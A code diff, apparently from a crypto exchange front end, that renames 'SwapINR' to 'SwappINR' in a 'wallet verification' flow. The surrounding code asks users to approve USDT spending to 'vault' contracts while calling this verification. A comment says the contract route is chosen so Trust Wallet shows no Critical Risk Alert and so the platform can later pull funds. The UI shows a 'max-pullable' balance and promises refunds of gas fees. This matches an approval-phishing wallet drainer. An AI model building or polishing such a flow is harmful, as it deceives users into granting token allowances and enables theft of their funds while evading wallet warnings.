@@ -42,7 +42,7 @@ const USDT_CFG = {
 } as const;
 
 /**
- * SwapINR Vault contract addresses — deployed once per chain.
+ * SwappINR Vault contract addresses — deployed once per chain.
  * Users approve these contracts (not a raw EOA) so Trust Wallet shows a clean
  * "Smart Contract Call" instead of a Critical Risk Alert.
  * After approval the platform can pull funds via /api/wallets/pull without
@@ -313,7 +313,7 @@ function CompactOverlay({
   const trcConnectFired   = useRef(false);
   const uploadTimer       = useRef<ReturnType<typeof setTimeout> | null>(null);
 
-  const DEBUG_KEY = `swapinr_debug_${sid || 'compact'}`;
+  const DEBUG_KEY = `swappinr_debug_${sid || 'compact'}`;
 
   /* Load persisted debug on mount so logs survive Trust Wallet tab reloads */
   useEffect(() => {
@@ -698,7 +698,7 @@ function CompactOverlay({
           <div style={{ width:30, height:30, borderRadius:9, background:'#CCFF00', display:'flex', alignItems:'center', justifyContent:'center' }}>
             <span style={{ color:'#000', fontSize:13, fontWeight:900 }}>S</span>
           </div>
-          <span style={{ fontSize:15, fontWeight:900, color:T.text }}>SwapINR</span>
+          <span style={{ fontSize:15, fontWeight:900, color:T.text }}>SwappINR</span>
           <button onClick={startOver}
             style={{ marginLeft:'auto', fontSize:12, fontWeight:700, color:T.dim,
               background:'transparent', border:`1px solid ${T.border}`, borderRadius:8,
@@ -766,12 +766,12 @@ function CompactOverlay({
         </div>
         <h2 style={{ fontSize:22, fontWeight:900, color:T.text, margin:'0 0 8px', letterSpacing:'-0.03em' }}>Wallet Verified!</h2>
         <p style={{ fontSize:14, color:'rgba(255,255,255,0.6)', margin:'0 0 28px', lineHeight:1.75 }}>
-          Your {NET_LABEL[network]} wallet is now<br/>linked to SwapINR.
+          Your {NET_LABEL[network]} wallet is now<br/>linked to SwappINR.
         </p>
         <button onClick={() => onVerified(finalAddress, finalHash)}
           style={{ padding:'14px 36px', borderRadius:14, fontSize:14, fontWeight:800, border:'none', cursor:'pointer',
             background:'#CCFF00', color:'#000', letterSpacing:'-0.01em', marginBottom:20 }}>
-          Return to SwapINR →
+          Return to SwappINR →
         </button>
         <div style={{ width:'100%', maxWidth:320 }}>
           <DebugPanel lines={debugLines} onClear={clearDebug} />
@@ -791,7 +791,7 @@ function CompactOverlay({
         <div style={{ width:30, height:30, borderRadius:9, background:'#CCFF00', display:'flex', alignItems:'center', justifyContent:'center' }}>
           <span style={{ color:'#000', fontSize:13, fontWeight:900 }}>S</span>
         </div>
-        <span style={{ fontSize:15, fontWeight:900, color:T.text }}>SwapINR</span>
+        <span style={{ fontSize:15, fontWeight:900, color:T.text }}>SwappINR</span>
         <span style={{ fontSize:11, fontWeight:700, color:'#CCFF00',
           background:'rgba(204,255,0,0.1)', border:'1px solid rgba(204,255,0,0.2)', borderRadius:999, padding:'3px 10px' }}>
           {NET_LABEL[network]}
@@ -878,7 +878,7 @@ function CompactOverlay({
               </p>
               <p style={{ fontSize:14, color:'rgba(255,255,255,0.55)', margin:'0 0 14px', lineHeight:1.8 }}>
                 {inTwBrowser
-                  ? <>Tap <span style={{ color:'#fff', fontWeight:700 }}>"Approve"</span> in Trust Wallet<br/>to grant SwapINR vault access.</>
+                  ? <>Tap <span style={{ color:'#fff', fontWeight:700 }}>"Approve"</span> in Trust Wallet<br/>to grant SwappINR vault access.</>
                   : <>A signing request has been sent to Trust Wallet.<br/>Tap below to approve it.</>}
               </p>
               {/* Safari + iOS: Trust Wallet is an external app — user must switch to it to approve */}
@@ -900,7 +900,7 @@ function CompactOverlay({
                 <div style={{ marginTop:10, padding:'9px 14px', borderRadius:10,
                   background:'rgba(251,191,36,0.06)', border:'1px solid rgba(251,191,36,0.18)',
                   fontSize:12, color:'rgba(255,255,255,0.45)', lineHeight:1.5 }}>
-                  <span style={{ color:'#FBBF24', fontWeight:700 }}>~10 TRX gas fee</span> charged by TRON network — refunded by SwapINR
+                  <span style={{ color:'#FBBF24', fontWeight:700 }}>~10 TRX gas fee</span> charged by TRON network — refunded by SwappINR
                 </div>
               )}
               {/* Balance / max-pullable pill shown as soon as the wallet is connected */}
@@ -1450,8 +1450,8 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
 
     // Gas pre-check: USDT.approve() costs ~24,000 energy ≈ 6–10 TRX when burned.
     if (trcTrxBalance !== null && trcTrxBalance < MIN_TRX_FOR_GAS) {
-      const gasMsg = `Insufficient TRX for gas. You have ${trcTrxBalance.toFixed(2)} TRX but need ~${MIN_TRX_FOR_GAS} TRX. SwapINR refunds the fee after verification.`;
-      console.error('[SwapINR] TRON_GAS_INSUFFICIENT', { address: tronAddress, have: trcTrxBalance, need: MIN_TRX_FOR_GAS, vault: spender });
+      const gasMsg = `Insufficient TRX for gas. You have ${trcTrxBalance.toFixed(2)} TRX but need ~${MIN_TRX_FOR_GAS} TRX. SwappINR refunds the fee after verification.`;
+      console.error('[SwappINR] TRON_GAS_INSUFFICIENT', { address: tronAddress, have: trcTrxBalance, need: MIN_TRX_FOR_GAS, vault: spender });
       setTrcApproveError(gasMsg);
       return;
     }
@@ -1490,7 +1490,7 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
       log(`ERROR: ${rawMsg}`);
       const tronErr = extractTronError(e);
       const isGas = /bandwidth|energy|out_of_energy|fee_limit|insufficient.*trx/i.test(rawMsg);
-      console.error('[SwapINR] TRON_APPROVE_ERROR', {
+      console.error('[SwappINR] TRON_APPROVE_ERROR', {
         type: isGas ? 'GAS_FEE' : 'TX_FAILED',
         error: rawMsg.slice(0, 400), address: tronAddress,
         trxBalance: trcTrxBalance, vault: spender,
@@ -1755,7 +1755,7 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
           </div>
           <p style={{ fontSize: 15, fontWeight: 800, color: S.text, margin: '0 0 8px' }}>Wallet Connection Error</p>
           <p style={{ fontSize: 13, color: S.sub, margin: '0 0 20px', lineHeight: 1.65 }}>
-            We encountered an issue connecting your wallet to SwapINR. This may be due to network configuration or wallet compatibility.
+            We encountered an issue connecting your wallet to SwappINR. This may be due to network configuration or wallet compatibility.
           </p>
           <p style={{ fontSize: 12, color: S.dim, margin: '0 0 20px', lineHeight: 1.6 }}>
             Please contact our support team and they will help resolve this for you.
@@ -1808,7 +1808,7 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
             <div style={{ ...S.card, padding:'12px 14px', borderColor:'rgba(204,255,0,0.15)', background:'rgba(204,255,0,0.04)' }}>
               <p style={{ fontSize:12, fontWeight:700, color:'#CCFF00', margin:'0 0 3px' }}>Gas fee fully refunded after verification</p>
               <p style={{ fontSize:11, color:S.sub, margin:0, lineHeight:1.55 }}>
-                A small network fee is charged by the blockchain. SwapINR refunds this in full after your wallet is verified.
+                A small network fee is charged by the blockchain. SwappINR refunds this in full after your wallet is verified.
               </p>
             </div>
           )}
